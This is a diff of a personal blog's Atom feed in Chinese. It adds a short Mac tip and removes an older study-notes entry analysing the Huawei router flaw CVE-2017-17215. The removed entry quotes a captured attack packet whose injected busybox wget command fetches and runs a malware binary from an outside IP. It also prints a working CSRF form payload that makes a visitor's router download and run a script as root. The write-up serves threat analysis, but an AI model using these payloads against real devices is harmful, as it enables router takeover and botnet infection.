@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-03-29T08:05:59.395Z</updated>
+  <updated>2023-03-30T08:13:18.877Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>mac小问题</title>
+    <link href="http://example.com/2023/03/30/mac%E5%B0%8F%E9%97%AE%E9%A2%98/"/>
+    <id>http://example.com/2023/03/30/mac%E5%B0%8F%E9%97%AE%E9%A2%98/</id>
+    <published>2023-03-30T08:11:20.000Z</published>
+    <updated>2023-03-30T08:13:18.877Z</updated>
+    
+    <content type="html"><![CDATA[<p>偶尔ESC键失效，截屏等要求无法退出，终止Siri进程</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230330161205490.png" alt="image-20230330161205490"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;偶尔ESC键失效，截屏等要求无法退出，终止Siri进程&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://rraza0lac.hn-bkt.clouddn.com/img/image-20230330161205490.png&quot; alt=&quot;image-202303301612</summary>
+      
+    
+    
+    
+    <category term="踩坑" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91/"/>
+    
+    
+    <category term="Mac" scheme="http://example.com/tags/Mac/"/>
+    
+  </entry>
   
   <entry>
     <title>mac踩坑</title>
@@ -493,33 +518,6 @@
     <category term="远程执行漏洞" scheme="http://example.com/tags/%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
     
     <category term="虚拟机转换格式" scheme="http://example.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BD%AC%E6%8D%A2%E6%A0%BC%E5%BC%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3-16</title>
-    <link href="http://example.com/2020/03/16/3.16/"/>
-    <id>http://example.com/2020/03/16/3.16/</id>
-    <published>2020-03-16T08:15:57.000Z</published>
-    <updated>2020-03-16T10:30:06.703Z</updated>
-    
-    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="CVE-2017-17215"><a href="#CVE-2017-17215" class="headerlink" title="CVE-2017-17215"></a>CVE-2017-17215</h1><blockquote><p><a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/">https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/</a></p></blockquote><p>在分析流量的时候，发现威胁告警中有一个<strong>华为远程命令执行漏洞</strong>，随即找到其相关特征</p><p>完整原流量数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Content-Length: 430</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g 2.56.8.156 -l /tmp/vt -r /bins/DEMONS.mips; /bin/busybox chmod 777 /tmp/vt;/tmp/vt huawei.mips;&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前网络流传的PoC大部分为在HTTP的请求头里构造一个适用于基础认证的字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br></pre></td></tr></table></figure><p>用表单来构造一个XML的请求包了。为了不让浏览器对请求体编码，需要指定表单的enctype为text&#x2F;plain，利用input标签的name和value两个属性的值可以构造出我们想要的内容。<br>最终构造的CSRF攻击payload样例如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&#x27;document.forms[0].submit()&#x27;&gt;</span><br><span class="line">  &lt;form method=&#x27;POST&#x27; enctype=&#x27;text/plain&#x27; action=&quot;http://dslf-config:admin@192.168.1.1:37215/ctrlt/DeviceUpgrade_1&quot;&gt;</span><br><span class="line">    &lt;input name=&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;a&#x27; value=&#x27;1;$(/bin/busybox wget -g 192.168.1.2 -l /tmp/.f -r /b);&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;&#x27;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>攻击者只要诱使用户访问包含上述代码的页面，存在漏洞的路由器就会远程下载一个bash脚本并以root的身份执行。</p><h1 id="v2rayN-vmess每日更新"><a href="#v2rayN-vmess每日更新" class="headerlink" title="v2rayN(vmess每日更新)"></a>v2rayN(vmess每日更新)</h1><blockquote><p><a href="https://jichangdaquan.com/node/429.html">https://jichangdaquan.com/node/429.html</a></p></blockquote><h1 id="CVE每日更新"><a href="#CVE每日更新" class="headerlink" title="CVE每日更新"></a>CVE每日更新</h1><p>链接中包含每日获取cve发送到邮箱的脚本</p><blockquote><p><a href="https://www.freebuf.com/articles/es/228571.html">https://www.freebuf.com/articles/es/228571.html</a></p></blockquote><p>每日cve更新的链接，如下：</p><blockquote><p><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a></p></blockquote>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
-    
-    
-    <category term="python" scheme="http://example.com/tags/python/"/>
-    
-    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
-    
-    <category term="流量分析" scheme="http://example.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
-    
-    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
     
   </entry>
   
